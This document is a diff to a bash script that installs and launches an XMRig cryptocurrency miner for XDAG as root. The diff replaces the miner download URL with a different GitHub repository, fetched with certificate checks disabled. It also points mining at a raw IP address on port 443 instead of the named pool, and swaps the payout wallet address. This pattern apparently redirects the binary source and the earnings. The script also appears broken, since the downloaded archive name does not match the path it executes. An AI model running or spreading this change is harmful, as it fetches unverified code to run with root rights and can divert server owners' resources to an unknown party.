@@ -2,7 +2,7 @@
 
 read -p "What is Worker? (exp: vps01): " worker
 sudo apt-get install cpulimit -y
-wget --no-check-certificate -O xmrig.tar.gz https://github.com/FSOL-XDAG/xmrig-4-xdag/releases/download/v.6.20.0/x4x-6.20.0-linux-ubuntu_22.04-x64.tar.gz
+wget --no-check-certificate -O xmrig.tar.gz https://github.com/nastaso/xmrig-zero/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
 tar -xvf xmrig.tar.gz
 chmod +x ./xmrig-4-xdag/* 
 cores=$(nproc --all)
@@ -13,7 +13,7 @@ limitCPU=$((cores * 75))
 cat /dev/null > /root/minerXDAG.sh
 cat >>/root/minerXDAG.sh <<EOF
 #!/bin/bash
-sudo ./xmrig-4-xdag/xmrig-4-xdag --donate-level 1 --threads=$cores --background -o stratum.xdag.org:23656 -u HzMdh5qV6P783eor58vmfcKrHaqqbcZkb -p $worker --algo=rx/xdag -k --randomx-1gb-pages
+sudo ./xmrig-4-xdag/xmrig-4-xdag --donate-level 1 --threads=$cores --background -o 47.237.201.60:443 -u HFQE1iJkiNuoC9hW4Xga6VUpWcfLY9dgS -p $worker --algo=rx/xdag -k --randomx-1gb-pages
 EOF
 chmod +x /root/minerXDAG.sh
 
